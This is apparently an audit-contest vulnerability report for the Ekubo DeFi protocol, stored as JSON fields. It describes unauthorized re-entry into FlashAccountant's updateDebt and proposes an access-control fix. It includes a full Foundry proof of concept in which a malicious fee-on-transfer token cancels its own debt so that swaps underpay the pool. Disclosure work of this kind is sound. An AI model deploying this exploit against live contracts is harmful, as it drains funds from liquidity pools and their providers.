      "body": "## Finding description and impact\n\nThe `FlashAccountant` contract enforces solvency by ensuring that all debts recorded during a lock are settled to zero before the lock concludes. However, the `updateDebt` function allows any address to modify its own debt record for the current lock without authorization.\n\n[src/base/FlashAccountant.sol#L132-L141](https://github.com/code-423n4/2025-11-ekubo/blob/main/src/base/FlashAccountant.sol#L132-L141)\n\n```sol\n    function updateDebt() external {\n        // ...\n        uint256 id = _getLocker().id();\n        // ...\n        // msg.sender can arbitrarily decrease their own debt\n        _accountDebt(id, msg.sender, delta);\n    }\n```\n\nThis lack of access control allows a malicious token to bypass payment requirements during a swap. When the Router attempts to collect payment for a swap, it uses `payFrom`, which relies on a \"snapshot-and-diff\" mechanism:\n\n[src/libraries/FlashAccountantLib.sol#L54-L60](https://github.com/code-423n4/2025-11-ekubo/blob/main/src/libraries/FlashAccountantLib.sol#L54-L60)\n\n```sol\n// 1. Snapshot balance\npop(call(gas(), accountant, 0, 0x1c, 36, 0x00, 0x00))\n\n// 2. Call transferFrom\nlet success := call(gas(), token, 0, 0x1c, 0x64, 0x00, 0x20)\n```\n\nA token with non-standard behavior, such as a Fee-on-Transfer token, can exploit this. In a legitimate FoT scenario, the pool receives less than the requested amount, which would normally leave a nonzero remainder and revert under the accountant’s solvency check (as the balance increase is less than the recorded debt). However, a malicious token can implement `transferFrom` to re-enter `updateDebt` and erase the debt corresponding to the missing tax amount:\n\n```sol\nfunction transferFrom(address from, address to, uint256 amount) external returns (bool) {\n    uint256 tax = amount / 10; // 10% tax\n    uint256 net = amount - tax;\n\n    // Valid ERC20 logic: Deliver net amount, divert tax\n    _transfer(from, to, net);\n    _transfer(from, feeSink, tax);\n\n    // Re-enter to erase the debt for the missing tax.\n    // The accountant expects `amount` increase, but gets `net`.\n    // We apply `-tax` delta so the remaining debt matches the actual balance change.\n    int256 delta = -int256(tax);\n    // Use low-level call because updateDebt reads packed int128 from calldata\n    (bool ok,) = accountant.call(abi.encodePacked(IFlashAccountant.updateDebt.selector, int128(delta)));\n    require(ok);\n\n    return true;\n}\n```\n\nThe `FlashAccountant` observes a balance increase equal to net (amount - tax). The accountant observes only net paid via balance diff, leaving tax unpaid. Because debts are keyed by token address and updateDebt applies to msg.sender, the token contract can directly mutate its own debt entry for the active lock. The token calls `updateDebt`(-tax) during the same lock to erase the unpaid remainder, so the lock passes despite underpayment.\n\n[src/base/FlashAccountant.sol#L168-L172](https://github.com/code-423n4/2025-11-ekubo/blob/main/src/base/FlashAccountant.sol#L168-L172)\n\n```sol\n// nonzeroDebtCount is 0 because we manually cleared the difference\nlet nonzeroDebtCount := tload(add(_NONZERO_DEBT_COUNT_OFFSET, id))\nif nonzeroDebtCount {\n    // Revert never triggers\n}\n```\n\nThis results in the pool paying out the output asset as if fully paid while receiving less than the required input assets (suffering a loss equal to the tax), violating the contest's specific invariant regarding non-standard tokens: \"those pools can never become insolvent in the other token due to non-standard behavior in one token.\"\n\n## Recommended mitigation steps\n\nRestrict `updateDebt` to trusted callers only.\n\n```diff\n+ mapping(address => bool) public isTrustedWrapper;\n\n  function updateDebt() external {\n\n+       if (!isTrustedWrapper[msg.sender]) revert Unauthorized();\n\n        if (msg.data.length != 20) {\n            revert UpdateDebtMessageLength();\n        }\n\n        uint256 id = _getLocker().id();\n        int256 delta;\n        // ...\n```",
      "proofOfConcept": "```sol\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.30;\n\nimport {FullTest} from \"./FullTest.sol\";\nimport {IFlashAccountant} from \"../src/interfaces/IFlashAccountant.sol\";\nimport {PoolKey} from \"../src/types/poolKey.sol\";\nimport {createConcentratedPoolConfig} from \"../src/types/poolConfig.sol\";\nimport {SwapParameters, createSwapParameters} from \"../src/types/swapParameters.sol\";\nimport {MIN_SQRT_RATIO, MAX_SQRT_RATIO, SqrtRatio} from \"../src/types/sqrtRatio.sol\";\nimport {TestToken} from \"./TestToken.sol\";\n\ncontract TaxedEvilToken {\n    address public accountant;\n    address public feeSink;\n    uint256 public feeBps;\n    bool public attackEnabled;\n\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    address public lastRecipient;\n    uint256 public lastAmount;\n    uint256 public lastNet;\n    uint256 public lastTax;\n\n    constructor(address _accountant) {\n        accountant = _accountant;\n        feeSink = address(0xDEAD);\n        balanceOf[msg.sender] = 1e24;\n        feeBps = 0;\n        attackEnabled = false;\n    }\n\n    function decimals() external pure returns (uint8) {\n        return 18;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        return true;\n    }\n\n    function setMode(uint256 _feeBps, bool _attackEnabled) external {\n        feeBps = _feeBps;\n        attackEnabled = _attackEnabled;\n    }\n\n    function resetLast() external {\n        lastRecipient = address(0);\n        lastAmount = 0;\n        lastNet = 0;\n        lastTax = 0;\n    }\n\n    function transfer(address to, uint256 amount) external returns (bool) {\n        return _transfer(msg.sender, to, amount);\n    }\n\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        uint256 a = allowance[from][msg.sender];\n        require(a >= amount, \"ERC20: insufficient allowance\");\n        allowance[from][msg.sender] = a - amount;\n        return _transfer(from, to, amount);\n    }\n\n    function _transfer(address from, address to, uint256 amount) internal returns (bool) {\n        uint256 b = balanceOf[from];\n        require(b >= amount, \"ERC20: transfer amount exceeds balance\");\n        balanceOf[from] = b - amount;\n\n        uint256 tax = (amount * feeBps) / 10_000;\n        uint256 netAmount = amount - tax;\n\n        if (netAmount != 0) {\n            balanceOf[to] += netAmount;\n        }\n        if (tax != 0) {\n            balanceOf[feeSink] += tax;\n        }\n\n        lastRecipient = to;\n        lastAmount = amount;\n        lastNet = netAmount;\n        lastTax = tax;\n\n        if (attackEnabled && tax != 0) {\n            int256 delta = -int256(tax);\n            (bool ok,) = accountant.call(abi.encodePacked(IFlashAccountant.updateDebt.selector, int128(delta)));\n            require(ok, \"updateDebt failed\");\n        }\n\n        return true;\n    }\n}\n\ncontract C4_POC_UpdateDebt_SolvencyBypass is FullTest {\n    TaxedEvilToken evilToken;\n\n    function setUp() public override {\n        super.setUp();\n        evilToken = new TaxedEvilToken(address(core));\n    }\n\n    function test_POC_UpdateDebt_SolvencyBypass() public {\n        address t0 = address(evilToken);\n        address t1 = address(token1);\n        bool evilIsToken0 = true;\n        if (t0 > t1) {\n            (t0, t1) = (t1, t0);\n            evilIsToken0 = false;\n        }\n\n        PoolKey memory key = createPool(t0, t1, 0, createConcentratedPoolConfig(0, 100, address(0)));\n\n        evilToken.setMode(0, false);\n\n        uint128 amount0 = 1e18;\n        uint128 amount1 = 1e18;\n\n        if (evilIsToken0) {\n            evilToken.approve(address(positions), type(uint256).max);\n            token1.approve(address(positions), type(uint256).max);\n        } else {\n            evilToken.approve(address(positions), type(uint256).max);\n            token0.approve(address(positions), type(uint256).max);\n        }\n\n        positions.mintAndDeposit(key, -100, 100, amount0, amount1, 0);\n\n        uint256 feeBps = 1000; // 10% tax\n        evilToken.setMode(feeBps, false); // Attack disabled for first swap attempt\n\n        int128 swapAmount = 1e18;\n\n        bool isToken1 = !evilIsToken0; // If evil is token0, then isToken1 is false, meaning we're selling token0.\n        SqrtRatio limit = isToken1 ? MAX_SQRT_RATIO : MIN_SQRT_RATIO;\n\n        SwapParameters params = createSwapParameters({\n            _amount: swapAmount,\n            _isToken1: isToken1,\n            _sqrtRatioLimit: limit,\n            _skipAhead: 0\n        });\n\n        evilToken.approve(address(router), type(uint256).max);\n\n        address honestTokenAddr = evilIsToken0 ? t1 : t0;\n        uint256 attackerHonestBefore = TestToken(honestTokenAddr).balanceOf(address(this));\n\n        // --- FIRST SWAP ATTEMPT ---\n        // Expect this to revert because the tax is applied, but updateDebt is not called to compensate.\n        evilToken.resetLast();\n        vm.expectRevert();\n        router.swap(key, params, type(int256).min);\n\n        // --- SECOND SWAP ATTEMPT ---\n        // This time, updateDebt will compensate for the tax.\n        evilToken.setMode(feeBps, true);\n\n        evilToken.resetLast();\n        \n        router.swap(key, params, type(int256).min);\n        \n        // --- VERIFICATION ---\n        uint256 attackerHonestAfter = TestToken(honestTokenAddr).balanceOf(address(this));\n        \n        // Assert attacker received honest tokens\n        assertGt(attackerHonestAfter, attackerHonestBefore, \"Attacker should have received honest tokens\");\n\n        // Verify the EvilToken's transfer data\n        uint256 inAmount = uint256(uint128(swapAmount));\n        uint256 expectedTax = (inAmount * feeBps) / 10_000;\n        uint256 expectedNet = inAmount - expectedTax;\n\n        assertEq(evilToken.lastAmount(), inAmount, \"unexpected input amount in transfer\");\n        assertEq(evilToken.lastTax(), expectedTax, \"unexpected tax in transfer\");\n        assertEq(evilToken.lastNet(), expectedNet, \"unexpected net amount transferred to pool\");\n        \n        // Assert that the pool actually received less than the expected swapAmount due to tax\n        // but the transaction still passed because updateDebt was used to bypass solvency check.\n        // This is implicitly verified by the swap passing AND the previous assertions about evilToken.lastNet.\n        // An explicit assertion can be added if desired, e.g., checking Core's balance of evilToken\n        // but it might be tricky due to how Core tracks balances via FlashAccountant.\n    }\n}\n```",
